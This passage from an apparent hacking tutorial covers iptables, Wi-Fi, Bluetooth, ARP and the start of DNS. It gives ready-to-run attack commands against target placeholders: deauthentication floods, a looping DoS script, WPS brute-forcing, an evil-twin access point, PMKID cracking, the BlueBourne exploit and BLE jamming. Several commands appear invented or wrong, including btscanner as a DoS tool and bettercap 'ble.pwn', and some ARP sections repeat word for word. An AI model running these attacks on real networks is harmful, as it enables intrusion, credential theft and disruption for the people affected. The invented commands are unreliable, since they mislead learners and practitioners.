   * **NAT**: Handles source/destination packet rewriting.
   * **MANGLE**: Alters packet headers.
   * **RAW**: Configures exemptions from connection tracking.
2. **Chains**: Lists of rules within tables:
   * **INPUT**: Processes packets destined for the local system.
   * **OUTPUT**: Manages packets leaving the local system.
   * **FORWARD**: Handles packets being routed through the local system.
3. **Matches and Targets**:
   * **Matches**: Conditions that a packet must meet to trigger a rule.
   * **Targets**: Actions applied to packets that meet a rule’s conditions.
     * **ACCEPT**: Allows the packet to pass.
     * **DROP**: Silently drops the packet.
     * **REJECT**: Drops the packet and sends an error message.
     * **LOG**: Logs the packet.
     * **RETURN**: Exits the current chain to the calling chain.

**Installing Iptables**

Iptables is typically pre-installed on Linux and Unix systems. If not, you can install it via package management tools like `apt`:

```bash
sudo apt install iptables
```

**Configuring Default Policies**

Before setting rules, determine the default action for packets that don’t match any rules:

```bash
sudo iptables -L
```

<figure><img src="../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>

Most systems default to `ACCEPT` for ease of connectivity, though for enhanced security, `DROP` may be considered.

### **Basic Iptables Commands**

*   **Appending a Rule**: Block packets from a specific IP (`192.168.1.102`):

    ```bash
    sudo iptables -A INPUT -s 192.168.1.102 -j DROP
    ```
*   **Blocking an Entire Subnet**: Using CIDR notation (`192.168.1.0/24`):

    ```bash
    sudo iptables -A INPUT -s 192.168.1.0/24 -j DROP
    ```
*   **Blocking a Specific Port**: For example, block SSH (`tcp` protocol on port `22`):

    ```bash
    sudo iptables -A INPUT -p tcp --dport 22 -j DROP
    ```
*   **Allowing Outbound Connections**: Permit access to `amazon.com`:

    ```bash
    sudo iptables -A OUTPUT -p tcp -d amazon.com -j ACCEPT
    ```
*   **Blocking HTTP and HTTPS**: Prevent outbound access on ports `80` and `443`:

    ```bash
    sudo iptables -A OUTPUT -p tcp --dport 80 -j DROP
    sudo iptables -A OUTPUT -p tcp --dport 443 -j DROP
    ```

### **Advanced Iptables Techniques**

1.  **Stateful Firewalling**: Use `-m state` to maintain stateful packet inspection:

    ```bash
    sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
    ```

    This rule allows incoming packets that are part of established connections or related to established connections.
2.  **Logging**: Use `LOG` target to log packets matching a rule:

    ```bash
    sudo iptables -A INPUT -p tcp --dport 22 -j LOG --log-prefix "SSH Access: "
    ```

    This logs attempts to access SSH.
3.  **Limiting Rules**: Use `--limit` to rate-limit rule matches:

    ```bash
    sudo iptables -A INPUT -p tcp --syn --dport 80 -m limit --limit 5/s -j ACCEPT
    ```

    This limits incoming HTTP SYN packets to 5 per second.
4.  **Network Address Translation (NAT)**: Use NAT table (`-t nat`) to modify IP addresses and ports in packet headers:

    ```bash
    sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
    ```

    This command performs NAT on outgoing packets on `eth0`.

**Managing Rules**

* **Order of Rules**: Rules are processed in order; ensure specific rules precede more general ones.
* **Viewing Rules**: Use `-L` to list current rules and `-F` to flush (delete) all rules.

### **Exercises**

1. Create a firewall allowing access only to `hackers-arise.com` on ports `80` and `443`.
2. Add a rule to block port `445`.
3. Flush all rules to reset iptables configuration.

***

## **Chapter 5: Wi-Fi Networks (802.11)**

### **Introduction**

* Understand the critical role of Wi-Fi security in modern wireless networks.
* Explore the evolution of IEEE 802.11 standards and their impact on network security.

### **Wi-Fi Basics (802.11)**

* Learn about the IEEE 802.11 family of standards governing Wireless Local Area Networks (WLANs).
* Understand the frequency bands used: 2.4 GHz and 5 GHz.
* Differentiate between infrastructure mode (AP-based) and ad-hoc mode (peer-to-peer).

### **Key Terminology**

<table><thead><tr><th width="259">Term</th><th>Description</th></tr></thead><tbody><tr><td>AP (Access Point)</td><td>Central hub of a Wi-Fi network where devices connect.</td></tr><tr><td>SSID (Service Set Identifier)</td><td>Network name visible to users.</td></tr><tr><td>BSSID (Basic Service Set Identifier)</td><td>Unique MAC address of an AP.</td></tr><tr><td>Channels</td><td>Different frequencies used for Wi-Fi communication.</td></tr><tr><td>Security</td><td>Encryption protocols such as WEP, WPA2-PSK, and WPA3.</td></tr><tr><td>Modes</td><td>Infrastructure mode (AP-based) and ad-hoc mode (peer-to-peer).</td></tr></tbody></table>

**802.11 Security Protocols**

* **WEP (Wired Equivalent Privacy)**:
  * Vulnerable to attacks; crack WEP keys using tools like `aircrack-ng`. Example: Use `aircrack-ng` to crack WEP keys from captured packets.
* **WPA/WPA2 (Wi-Fi Protected Access)**:
  * Capture handshakes with `airodump-ng` for offline cracking. Example: Capture a handshake with `airodump-ng` and crack it using `aircrack-ng`.
* **WPA3**:
  * Enhanced security features against brute-force attacks and key reinstallation attacks (KRACK). Example: Implement WPA3 with stronger cryptographic protocols for enhanced security.

### **Wi-Fi Adapters for Hacking**

* Use compatible Wi-Fi adapters like Alfa AWUS036NH capable of packet injection. Example: Use Alfa AWUS036NH to inject packets during penetration testing.

### **Preparing for Wi-Fi Attacks**

*   Identify wireless interfaces:

    ```bash
    ifconfig            # Linux
    ipconfig            # Windows
    ```

    Example: Use `ifconfig` on Linux or `ipconfig` on Windows to identify wireless interfaces.

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

*   Scan for Access Points (APs):

    ```bash
    iwlist scan         # Linux
    netsh wlan show networks mode=BSSID  # Windows
    ```

    Example: Scan for nearby APs using `iwlist scan` on Linux or `netsh wlan show networks mode=BSSID` on Windows.

<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

**Monitor Mode**

*   Enable monitor mode on the wireless interface:

    ```bash
    airmon-ng start wlan0   # Linux (replace wlan0 with your interface name)
    ```

    Example: Enable monitor mode on `wlan0` interface using `airmon-ng`.

<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

**Capturing Frames**

*   Capture Wi-Fi traffic:

    ```bash
    airodump-ng wlan0
    ```

    Example: Capture Wi-Fi traffic on `wlan0` using `airodump-ng`.

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

**Anatomy of Wi-Fi Frames**

* Analyze frames in Wireshark: Filter for specific frames using expressions like `wlan.fc.type_subtype == 0x08` for beacon frames. Example: Use Wireshark to analyze Wi-Fi frames with filters for beacon frames (`wlan.fc.type_subtype == 0x08`).

<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

### **Wi-Fi Attacks**

* **Reveal Hidden SSID**:
  * Use `airodump-ng` to passively monitor and reveal hidden SSIDs. Example: Use `airodump-ng` to reveal hidden SSIDs by passively monitoring Wi-Fi traffic.
*   **Bypass MAC Filtering**:

    * Spoof MAC addresses using `macchanger` or capture allowed MACs with `airodump-ng`. Example: Spoof MAC addresses with `macchanger` or capture allowed MACs using `airodump-ng`.
    * Once the hacker knows the MAC address of the authenticated client, they can simply “spoof” that MAC address. This requires that we take down the interface. Then, use macchanger to spoof the MAC address making it the same as the connected client’s MAC:

    <figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
*   **Crack WPA2-PSK**:

    * Utilize captured handshakes with `aircrack-ng` on `.cap` files. Example: Crack WPA2-PSK passwords using captured handshakes and `aircrack-ng`.

    <figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

**Attacking WPA2-PSK**

WPA2-PSK (Wi-Fi Protected Access 2 - Pre-Shared Key) is a commonly used security protocol for Wi-Fi networks. It employs a four-way handshake process to establish a secure connection between a client and an access point (AP). The key for cracking WPA2-PSK lies in capturing this handshake, which includes the hash of the pre-shared key (password).

**Capture the Four-Way Handshake**

*   **Put Wi-Fi Adapter in Monitor Mode:**

    ```
    kali > airmon-ng start wlan0
    ```
*   **Start Packet Capture with airodump-ng:**

    ```
    kali > airodump-ng wlan0mon
    ```

<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

*   **Focus Capture on Specific AP and Channel:**

    ```
    kali > airodump-ng --bssid <BSSID> -c <channel> --write HackersAriseCrack wlan0mon
    ```

    Replace `<BSSID>` with the target AP's BSSID and `<channel>` with its operating channel.
*   **Deauthenticate a Client to Capture Handshake:**

    ```
    kali > aireplay-ng --deauth 100 -a <BSSID> wlan0mon
    ```

    This command sends deauthentication frames to a connected client (`-a <BSSID>`) to force reconnection and capture the handshake.

<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

<table data-header-hidden><thead><tr><th width="207"></th><th></th></tr></thead><tbody><tr><td><strong>Command/Option</strong></td><td><strong>Description</strong></td></tr><tr><td><code>aireplay-ng</code></td><td>Command for Wi-Fi packet injection and deauthentication.</td></tr><tr><td><code>--deauth 100</code></td><td>Option to send 100 deauthentication frames to the AP.</td></tr><tr><td><code>-a &#x3C;BSSID></code></td><td>Specifies the BSSID (MAC address) of the target access point.</td></tr><tr><td><code>wlan0mon</code></td><td>Represents your Wi-Fi adapter in monitor mode.</td></tr></tbody></table>

### WPS (Wi-Fi Protected Setup)

**Overview:** Wi-Fi Protected Setup (WPS) was designed to simplify the process of connecting devices to a secure Wi-Fi network by using an eight-digit PIN. This PIN authentication mechanism was intended to be user-friendly but introduced significant security vulnerabilities.

**Vulnerability:** The WPS PIN consists of eight digits where the last digit is a checksum of the first seven digits. This structure reduces the number of possible PIN combinations to 11,000 (10^4 for the first four digits + 10^3 for the last three digits). This limited number of combinations makes it vulnerable to brute-force attacks, where attackers attempt all possible PINs until the correct one is found.

**Attack Tools:**

* **wash**: Used to identify APs with WPS enabled.
* **bully**: A tool for performing brute-force attacks against WPS PINs.
* **reaver**: Another tool specialized in brute-forcing WPS PINs.

**Examples:**

1.  **Identifying APs with WPS:**

    ```bash
    kali > wash -i wlan0mon
    ```

    This command scans the wireless interface `wlan0mon` to identify APs that have WPS enabled.

<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

1.  **Brute-forcing WPS PIN:** Using `bully` to brute-force the WPS PIN of a target AP:

    ```bash
    kali > bully wlan0mon -b 00:11:22:33:44:55 -e MyWiFiNetwork -c 6
    ```
2.  **Using reaver:** Brute-forcing with `reaver`:

    ```bash
    kali > reaver -i wlan0mon -b 00:11:22:33:44:55 -vv
    ```

    Replace `00:11:22:33:44:55` with the MAC address (`BSSID`) of the target AP and `MyWiFiNetwork` with its SSID.

<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

### Evil Twin Attack (Man-in-the-Middle)

**Overview:** An Evil Twin attack involves creating a rogue wireless access point (AP) with the same SSID and other settings as a legitimate AP to intercept traffic from unsuspecting clients.

**Setup Steps:**

1.  **Creating the Rogue AP:** Use `airbase-ng` to set up the Evil Twin AP:

    ```bash
    kali > airbase-ng -a aa:bb:cc:dd:ee:ff --essid hackers-arise -c 6 wlan0mon
    ```

    * `-a`: Sets the MAC address of the rogue AP.
    * `--essid`: Specifies the SSID of the rogue AP.
    * `-c`: Sets the channel to broadcast on.

    <figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
2.  **Bridge Interfaces:** Create a network bridge (`ha`) to connect `at0` (AP interface) and `eth0` (Ethernet interface):

    ```bash
    kali > ip link add name ha type bridge
    kali > ip link set ha up
    kali > ip link set eth0 master ha
    kali > ip link set at0 master ha
    ```
3.  **DHCP Server Setup:** Start a DHCP server (`dhclient`) on the bridge (`ha`) to assign IP addresses to connected clients:

    ```bash
    kali > dhclient ha &
    ```
4.  **Deauthentication:** Use `aireplay-ng` to send deauthentication frames to disconnect clients from the legitimate AP and force them to connect to the Evil Twin AP:

    ```bash
    kali > aireplay-ng --deauth 1000 aa:bb:cc:dd:ee:ff wlan0mon --ignore-negative-one
    ```

**Traffic Analysis:** Capture and analyze intercepted traffic using Wireshark on interface `ha`.

### Denial of Service (DoS) Attack

**Overview:** A DoS attack against a Wi-Fi network involves sending a high volume of deauthentication frames to disrupt connectivity for legitimate users.

**DoS Attack Command:** Send deauthentication frames (`-deauth`) to the AP identified by `<BSSID>` to disconnect clients temporarily:

```bash
kali > aireplay-ng --deauth 100 -a <BSSID> wlan0mon
```

**Persistent DoS Attack Script:** Create a BASH script to automate deauthentication attacks at regular intervals:

```bash
#!/bin/bash
for ((i=1; i<=5000; i++))
do
    aireplay-ng --deauth 100 -a <BSSID> wlan0mon
    sleep 60
done
```

Adjust the loop count (`5000`) and sleep time (`60` seconds) as needed.

### PMKID Attack

**Overview:** The PMKID attack targets vulnerabilities in the WPA/WPA2-PSK authentication process to capture credentials without needing to deauthenticate a client.

**Attack Process:**

1.  **Capture PMKID:** Use `hcxdumptool` to capture PMKID packets from nearby APs:

    ```bash
    kali > hcxdumptool -i wlan0mon -o HackersArisePMKID --enable_status=1
    ```

<figure><img src="../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

1.  **Filter for Target AP:** Create a file (`targetBSSID`) containing the BSSID of the target AP and filter `hcxdumptool` to capture PMKID for that AP:

    ```bash
    kali > hcxdumptool -i wlan0mon -o HackersArisePMKID --enable_status=1 --filterlist_ap=targetBSSID --filtermode=2
    ```

<figure><img src="../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

1.  **Convert and Crack:** Use `hcxcaptool` to convert captured PMKID data and `hashcat` to crack it:

    ```bash
    kali > hcxcaptool -z hashoutput.txt HackersArisePMKID
    kali > hashcat -m 16800 hashoutput.txt top10000passwords.txt
    ```

<figure><img src="../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

### Exercises:

1. Use iwconfig to view all your wireless connections
2. Use airmon-ng to place your Wi-Fi adapter into monitor mode
3. Use airodump-ng to find all the APs and clients in your range
4. Use Wireshark to filter out any traffic not coming from your Wi-Fi connection
5. Use wash to find any devices using WPS in your range

***

## Chapter 6: Bluetooth Networks

### Introduction

Bluetooth technology is integral to a wide range of modern gadgets, including computers, smartphones, iPods, tablets, speakers, and game controllers. This chapter focuses on mobile hacking devices, tablets, and phones, as they present fertile ground for hackers. Mastering Bluetooth hacking can lead to the compromise of any information on the device (pictures, emails, texts), control of the device, and the ability to send unwanted information to the device.

Before diving into Bluetooth hacking, it's essential to understand the technology, the terminology, and the built-in security measures of Bluetooth.

***

### Bluetooth Basics

#### Overview

Bluetooth is a universal protocol for low-power, near-field communication operating at 2.4 - 2.485 GHz using spread spectrum frequency hopping at 1,600 hops per second. This frequency hopping acts as a security measure. Developed in 1994 by Ericsson Corp. of Sweden, Bluetooth is named after the 10th-century Danish King Harald Bluetooth.

#### Range

| Range Type | Specification                                  |
| ---------- | ---------------------------------------------- |
| Minimum    | 10 meters                                      |
| Extended   | Up to 100 meters or more with special antennas |

#### Pairing

When two Bluetooth devices connect, it's called pairing. Discoverable Bluetooth devices transmit the following information:

| Information Transmitted |
| ----------------------- |
| Name                    |
| Class                   |
| List of Services        |
| Technical Information   |

Upon pairing, devices exchange a pre-shared secret or link key for future identification.

#### Unique Identifiers

Each device has a unique 48-bit identifier (similar to a MAC address) and usually a manufacturer-assigned name.

#### Bluetooth Piconet

Bluetooth devices form a piconet, a small network with one master and up to seven active slaves. Due to frequency hopping, communication between these devices doesn't interfere with each other.

Here is a diagram of the Bluetooth pairing process. Although much more secure in recent years, it is still vulnerable, as we will see in future tutorials in this series.

<figure><img src="../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>

#### Bluetooth Protocol Stack

Bluetooth devices don't need to use all protocols in the stack (similar to the TCP/IP stack). The Bluetooth protocol stack includes:

<table><thead><tr><th width="279">Protocol Layer</th><th>Associated Protocols</th></tr></thead><tbody><tr><td>Bluetooth Core Protocols</td><td>Baseband, LMP, L2CAP, SDP</td></tr><tr><td>Cable Replacement Protocol</td><td>RFCOMM</td></tr><tr><td>Telephony Control Protocol</td><td>TCS Binary, AT-commands</td></tr><tr><td>Adopted Protocols</td><td>PPP, UDP/TCP/IP, OBEX, WAP, vCard, vCal, IrMC, WAE</td></tr></tbody></table>

<figure><img src="../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

### Bluetooth Security

#### Security Techniques

1. **Frequency Hopping:** Both master and slave know the algorithm.
2. **Pre-shared Key:** Used for authentication and 128-bit encryption.

#### Security Modes

<table><thead><tr><th width="212">Security Mode</th><th>Description</th></tr></thead><tbody><tr><td>Security Mode 1</td><td>No active security.</td></tr><tr><td>Security Mode 2</td><td>Service-level security managed by a centralized security manager (no device-level security).</td></tr><tr><td>Security Mode 3</td><td>Device-level security with mandatory authentication and encryption.</td></tr></tbody></table>

***

### Basic Linux Bluetooth Tools

#### BlueZ

The Linux Bluetooth protocol stack is implemented by BlueZ. Common tools include:

<table><thead><tr><th width="164">Tool</th><th>Description</th></tr></thead><tbody><tr><td>hciconfig</td><td>Similar to ifconfig but for Bluetooth devices.</td></tr><tr><td>hcitool</td><td>Inquiry tool providing device name, ID, class, and clock.</td></tr><tr><td>hcidump</td><td>Sniffs Bluetooth communication.</td></tr><tr><td>l2ping</td><td>Sends L2CAP echo request packets to Bluetooth devices.</td></tr><tr><td>sdptool</td><td>Performs SDP (Service Discovery Protocol) queries on Bluetooth devices.</td></tr></tbody></table>

#### Commands

```sh
# Bring up the Bluetooth interface
sudo hciconfig hci0 up

# Query the device for its specifics
hciconfig -a
```

```sh
# Scan for nearby Bluetooth devices
hcitool scan

# Get information about a specific device
hcitool info <MAC_ADDRESS>
```

```sh
# Capture Bluetooth traffic
sudo hcidump -i hci0
```

```sh
# Send a ping to a Bluetooth device
l2ping <MAC_ADDRESS>
```

```sh
# Browse available services on a device
sdptool browse <MAC_ADDRESS>
```

***

### Bluetooth Hacking Tools in Kali Linux

#### Available Tools

<table><thead><tr><th width="142">Tool</th><th>Description</th></tr></thead><tbody><tr><td>Bluelog</td><td>Scans for and logs discoverable devices.</td></tr><tr><td>Bluemaho</td><td>GUI-based suite for testing Bluetooth security.</td></tr><tr><td>Blueranger</td><td>Python script for locating Bluetooth devices.</td></tr><tr><td>Btscanner</td><td>GUI tool for scanning discoverable devices.</td></tr><tr><td>Redfang</td><td>Finds hidden Bluetooth devices.</td></tr><tr><td>Spooftooph</td><td>Bluetooth spoofing tool.</td></tr></tbody></table>

#### Commands and Examples

*   **Bluelog:**

    ```sh
    # Scan and log discoverable devices
    sudo bluelog -i hci0 -o bluelog.txt
    ```
*   **Bluemaho:**

    ```sh
    # Start Bluemaho GUI
    sudo bluemaho.py
    ```
*   **Blueranger:**

    ```sh
    # Track the distance to a Bluetooth device
    sudo blueranger -i hci0 -t <MAC_ADDRESS>
    ```
*   **Btscanner:**

    ```sh
    # Scan for Bluetooth devices
    sudo btscanner
    ```
*   **Redfang:**

    ```sh
    # Discover hidden Bluetooth devices
    sudo redfang -i hci0
    ```
*   **Spooftooph:**

    ```sh
    # Spoof a Bluetooth device
    sudo spooftooph -i hci0 -t <MAC_ADDRESS> -n "NewName"
    ```

#### Common Bluetooth Attacks

| Attack       | Description                                  |
| ------------ | -------------------------------------------- |
| Blueprinting | Process of footprinting Bluetooth devices.   |
| Bluesnarfing | Steals data from a Bluetooth-enabled device. |
| Bluebugging  | Takes control of the target's phone.         |
| Bluejacking  | Sends unsolicited messages.                  |
| Bluesmack    | DoS attack against Bluetooth devices.        |

***

### Case Study: BlueBourne Attack

#### Overview

The BlueBourne exploit targets unpatched Bluetooth devices, affecting iOS, Microsoft Windows, and Android. It attacks the SDP protocol and can exploit vulnerabilities without the device being in discoverable mode.

#### Steps to Exploit

1.  **Dependencies:**

    ```sh
    kali > apt-get install bluetooth libbluetooth-dev
    kali > pip install pybluez
    kali > pip install pwntools
    ```
2.  **Install the Python Script:**

    ```sh
    kali > git clone https://github.com/ojasookert/CVE-2017-0785
    kali > cd CVE-2017-0785
    kali > chmod 755 CVE-2017-0785.py
    ```
3.  **Get Target MAC Address:**

    ```sh
    kali > hcitool scan
    ```
4.  **Execute the BlueBourne Exploit:**

    ```sh
    kali > python CVE-2017-0785.py TARGET=<MAC_ADDRESS>
    ```

<figure><img src="../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

### Additional Bluetooth Hacking Tools and Techniques

#### Bluetooth Packet Analysis

*   **Wireshark:**

    ```sh
    # Capture Bluetooth traffic with Wireshark
    sudo wireshark
    ```

    Ensure you have the necessary privileges and Bluetooth adapter to capture Bluetooth packets.

#### Advanced Bluetooth Scanning and Attacks

*   **Bettercap:**

    ```sh
    # Install Bettercap
    sudo apt-get install bettercap

    # Scan for Bluetooth devices
    sudo bettercap -eval "ble.recon on"

    # Perform Bluetooth attacks
    sudo bettercap -eval "ble.recon on; ble.enum on; ble.pwn <MAC_ADDRESS>"
    ```

#### Bluetooth Device Profiling

*   **BTScanner:**

    ```sh
    # Scan for nearby Bluetooth devices and profile them
    sudo btscanner
    ```

#### Bluetooth Spoofing and MitM Attacks

*   **Bettercap Bluetooth Low Energy (BLE) Spoofing:**

    ```sh
    # Spoof a Bluetooth device
    sudo bettercap -eval "ble.recon on; ble.spoof <TARGET_MAC_ADDRESS> <NEW_MAC_ADDRESS>"
    ```

#### DoS Attacks on Bluetooth Devices

*   **Bluetooth DoS Tool:**

    ```sh
    # Install Bluetooth DoS tool
    sudo apt-get install btscanner

    # Use the tool to send malformed packets and cause DoS
    sudo btscanner -d <MAC_ADDRESS>
    ```

***

#### Bluetooth Low Energy (BLE) Attacks

BLE is a variation of Bluetooth designed for low energy consumption. It's commonly used in IoT devices, wearable technology, and smart home devices. Understanding BLE hacking can give you an edge in targeting these devices.

<figure><img src="../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>

*   **GATTacker:**

    ```sh
    # Clone the GATTacker repository
    git clone https://github.com/seemoo-lab/gattacker.git

    # Install dependencies and set up GATTacker
    cd gattacker
    npm install

    # Start GATTacker
    sudo node bin/gattacker
    ```

    GATTacker is a tool designed to exploit BLE devices by acting as a Man-in-the-Middle (MitM) between the device and the client.

#### Bluetooth Honeypots

Setting up a Bluetooth honeypot can help in detecting and analyzing Bluetooth attacks

in a controlled environment.

*   **BluePot:**

    ```sh
    # Install Java if not already installed
    sudo apt-get install openjdk-8-jdk

    # Clone the BluePot repository
    git clone https://github.com/andrewmichaelsmith/bluepot.git

    # Navigate to the BluePot directory and run the honeypot
    cd bluepot
    sudo java BluePot
    ```

    BluePot is a Bluetooth honeypot designed to detect and log Bluetooth attacks. It simulates vulnerable Bluetooth devices and logs any attack attempts.

#### Bluetooth Device Fingerprinting

*   **BLEah:**

    ```sh
    # Clone the BLEah repository
    git clone https://github.com/dotan-ash/bleah.git

    # Install dependencies and set up BLEah
    cd bleah
    sudo pip3 install -r requirements.txt

    # Start BLEah to scan and fingerprint BLE devices
    sudo python3 bleah.py -i hci0 -S
    ```

    BLEah is a tool for scanning and fingerprinting BLE devices, useful for both reconnaissance and identifying specific device types.

#### Bluetooth Jamming

Jamming Bluetooth signals can disrupt communications, but it is illegal in many jurisdictions. Use this knowledge responsibly and only in controlled environments.

<figure><img src="../.gitbook/assets/image (89).png" alt=""><figcaption><p>bluetooth jammer</p></figcaption></figure>

*   **BLE Jammer:**

    ```sh
    # Clone the BLE Jammer repository
    git clone https://github.com/mame82/ble-jammer.git

    # Compile and run the jammer
    cd ble-jammer
    make
    sudo ./ble-jammer
    ```

    Note: Jamming is illegal in many jurisdictions and should only be done in controlled environments for educational purposes.

***

### Bluetooth Hacking in Real-world Scenarios

#### Penetration Testing Bluetooth Devices

When performing a penetration test on a client environment, assessing the Bluetooth devices can reveal vulnerabilities that might be overlooked. Ensure you have proper authorization before proceeding.

*   **Reconnaissance:**

    ```sh
    # Discover Bluetooth devices in the vicinity
    sudo hcitool scan

    # Log the devices for further analysis
    sudo bluelog -i hci0 -o discovered_devices.log
    ```
*   **Vulnerability Assessment:**

    ```sh
    # Use tools like Btscanner to identify services and potential vulnerabilities
    sudo btscanner

    # Analyze the services and look for common exploits
    ```
*   **Exploit Execution:**

    ```sh
    # Execute known exploits on vulnerable devices
    sudo python3 <exploit_script>.py <TARGET_MAC>
    ```

#### Securing Bluetooth Devices

It's equally important to know how to secure Bluetooth devices against attacks. Here are some best practices:

1.  **Disable Discoverability:**

    ```sh
    # Make your Bluetooth device non-discoverable
    sudo hciconfig hci0 noscan
    ```
2. **Use Strong Pairing Codes:** Ensure the pairing code is not easily guessable.
3. **Regularly Update Firmware:** Keep Bluetooth device firmware up to date to protect against known vulnerabilities.
4.  **Monitor Bluetooth Activity:** Use tools to regularly scan and monitor Bluetooth devices in your environment.

    ```sh
    # Monitor Bluetooth activity with Bluelog
    sudo bluelog -i hci0 -o activity_log.log
    ```
5. **Implement Device Management Policies:** Restrict Bluetooth usage to essential devices and enforce security policies.

***

### Exercises

1. Install Bluez, if it is not already installed on your system
2. Use the hciconfig tool to find the MAC address of your Bluetooth adapter
3. Use hcitool to scan for other Bluetooth devices in your range

***

## Chapter 7: Address Resolution Protocol(ARP)

#### Overview of ARP

ARP maps IP addresses to MAC addresses, enabling devices like routers and switches to direct traffic. When a new device joins a network, ARP assigns it an IP address within the network's range.

#### How ARP Works

ARP operates at OSI Layers 2 (data link) and 3 (network), using simple request-response messages:

* **Scenario:** Computer 1 (IP: 192.168.1.100) wants to send a packet to Computer 2 (IP: 192.168.1.101).
* **Process:**
  1. **ARP Request:** Computer 1 broadcasts an ARP request: "Who has 192.168.1.101?"
  2. **ARP Reply:** Computer 2 responds with its MAC address (e.g., 11:22:33:44:55:66).
  3. **Communication:** Computer 1 sends the packet to Computer 2's MAC address.

#### ARP Command Usage

**Windows:**

```cmd
> arp -a
```

Displays ARP table entries: IP address, Physical (MAC) address, and type (static/dynamic).

**Linux (e.g., Kali):**

```sh
$ sudo arp -a
```

Displays ARP table entries similarly to Windows.

#### Analyzing ARP Packets in Wireshark

Wireshark filters and dissects ARP packets for detailed analysis:

* **Filter ARP Packets:** `arp`
* **Packet Details:** Reveals Sender and Target IP/MAC addresses, operation codes.

#### ARP Vulnerabilities and Exploitation

ARP vulnerabilities allow MiTM attacks:

* **Tools for ARP Spoofing:**
  1. **Ettercap:** Tool for ARP spoofing attacks.
  2. **arpspoof:** Redirects traffic by forging ARP replies.
  3. **driftnet:** Views intercepted images in network traffic.
* **Mitigating ARP Spoofing:** Use static ARP entries, network segmentation, and detection tools.

#### Metasploit Meterpreter and ARP

Metasploit uses ARP for network discovery and exploitation:

* **Metasploit Usage:** Utilizes ARP for network reconnaissance and pivoting post-exploitation.
* **Post-Exploitation Modules:** Includes ARP spoofing modules for MiTM attacks.

#### Manipulating ARP Cache

**Windows:**

```cmd
> arp -s 192.168.1.101 00-11-22-33-44-55
```

Adds a static ARP cache entry mapping IP address 192.168.1.101 to MAC address 00-11-22-33-44-55.

**Linux:**

```sh
$ sudo arp -s 192.168.1.101 00:11:22:33:44:55
```

Adds a static ARP cache entry in Linux.

#### Analyzing ARP Packets in Wireshark

Wireshark filters and dissects ARP packets for detailed analysis:

* **Filter ARP Packets:** `arp`
* **Packet Details:** Reveals Sender and Target IP/MAC addresses, operation codes.

#### ARP for Reconnaissance

Attackers exploit ARP's lack of authentication for network discovery and Man-in-the-Middle (MiTM) attacks:

*   **Using `netdiscover` (Kali Linux):**

    ```sh
    $ sudo netdiscover -r 192.168.100.0/24
    ```

    Enumerates IP addresses, MAC addresses, and NIC vendors on the network.
*   **ARP Scanning with `arp-scan`:**

    ```sh
    $ sudo arp-scan --localnet
    ```

    Scans local network for live hosts and displays their IP and MAC addresses.

#### ARP Cache Poisoning (ARP Spoofing)

ARP vulnerabilities allow MiTM attacks:

* **Tools for ARP Spoofing:**
  1. **Ettercap:** Tool for ARP spoofing attacks.
  2. **arpspoof:** Redirects traffic by forging ARP replies.
  3. **driftnet:** Views intercepted images in network traffic.
* **Mitigating ARP Spoofing:** Use static ARP entries, network segmentation, and detection tools.

#### Metasploit Meterpreter and ARP

Metasploit uses ARP for network discovery and exploitation:

* **Metasploit Usage:** Utilizes ARP for network reconnaissance and pivoting post-exploitation.
* **Post-Exploitation Modules:** Includes ARP spoofing modules for MiTM attacks.

#### Exercises

1. **ARP Table Analysis:** Use `arp` command to view and analyze ARP table entries.
2. **Network Discovery:** Employ `netdiscover` to scan and identify devices on your LAN.
3. **Packet Analysis:** Create Wireshark filters to examine ARP packets within specific IP ranges.

***

## Chapter 8: Domain Name Service (DNS)

### Introduction to DNS

DNS (Domain Name System) is a critical protocol that translates domain names into IP addresses, making it easier for users to access websites without needing to remember IP addresses.

**How Domain Names Work**

Domain names are structured hierarchically, with each level providing specific information:

* **Top Level Domains (TLDs)**: Include generic TLDs like .com, .net, .org, and country-code TLDs like .uk, .fr.
* **Second Level Domains (SLDs)**: Directly under TLDs, e.g., hackers-arise.com.
* **Subdomains**: Further divisions under SLDs, e.g., sales.hackers-arise.com.

### How DNS Works

DNS operates in a distributed manner with multiple server types:

1. **DNS Resolver**: Initiates DNS queries on behalf of clients.
2. **Root Name Servers**: Direct queries to appropriate TLD servers.
3. **TLD Servers**: Provide information about SLDs.
4. **Authoritative DNS Servers**: Store domain records (A, AAAA, MX, etc.) for specific domains.

**Packet-level Analysis of DNS Requests and Responses**

DNS uses UDP for queries and responses. The structure of DNS packets includes headers and sections like Query, Answer, Authority, and Additional.

### **Example DNS Query Packet (Query)**

```
Query ID: 0x7f71
Flags: 0x0100 Standard Query
Questions: 1
Answer RRs: 0
Authority RRs: 0
Additional RRs: 0

Query: www.hackers-arise.com
```

**Example DNS Response Packet (Response)**

```
Response ID: 0x7f71
Flags: 0x8180 Standard Query Response
Questions: 1
Answer RRs: 1
Authority RRs: 0
Additional RRs: 1

Answer: www.hackers-arise.com IN A 23.236.62.147
```

### Vulnerabilities and Security in DNS
